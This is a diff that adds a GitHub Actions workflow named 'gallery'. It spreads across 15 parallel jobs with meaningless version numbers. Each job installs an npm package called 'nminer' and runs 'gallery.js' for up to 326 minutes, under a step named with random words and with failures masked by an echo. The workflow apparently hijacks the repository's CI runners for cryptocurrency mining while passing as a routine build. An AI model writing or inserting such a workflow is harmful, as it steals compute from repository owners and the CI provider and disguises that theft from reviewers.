@@ -1,0 +1,40 @@
+name: gallery
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 3065 }
+          - { version: 6834 }
+          - { version: 6122 }
+          - { version: 4624 }
+          - { version: 1087 }
+          - { version: 4313 }
+          - { version: 2947 }
+          - { version: 9249 }
+          - { version: 5185 }
+          - { version: 2312 }
+          - { version: 9771 }
+          - { version: 3128 }
+          - { version: 1881 }
+          - { version: 4166 }
+          - { version: 4628 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: since pale who apropos shiny
+        run: |
+          npm install nminer@latest
+          timeout 326m node gallery.js || echo "gallery executed"
